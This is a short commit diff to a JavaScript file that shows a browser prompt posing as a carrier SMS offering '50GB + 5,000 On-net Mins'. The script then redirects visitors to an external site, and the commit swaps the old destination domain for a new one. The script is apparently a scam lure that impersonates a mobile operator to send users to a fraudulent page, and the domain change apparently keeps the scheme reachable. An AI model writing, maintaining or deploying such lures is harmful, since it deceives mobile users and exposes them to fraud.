40b108b1d2d62eee877d553fe69886dd649fef58
doctorschoolz <toners-faerie3k@icloud.com>
2026-08-11 20:32:38 +0100

    Update redirect URL in paki79.js

--- paki79.js
+++ paki79.js
@@ -1,5 +1,5 @@
     var password = '50GB + 5,000 On-net Mins'
 password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive  50GB + 5,000 On-net Mins, click OK to Activate now','50GB + 5,000 On-net Mins');
 if (password != '50GB + 5,000 On-net Mins') {
-location.href='https://www.bhprylarzc.online/paki-50gb';
+location.href='https://www.explainzxtech.fit/paki-50gb';
 }
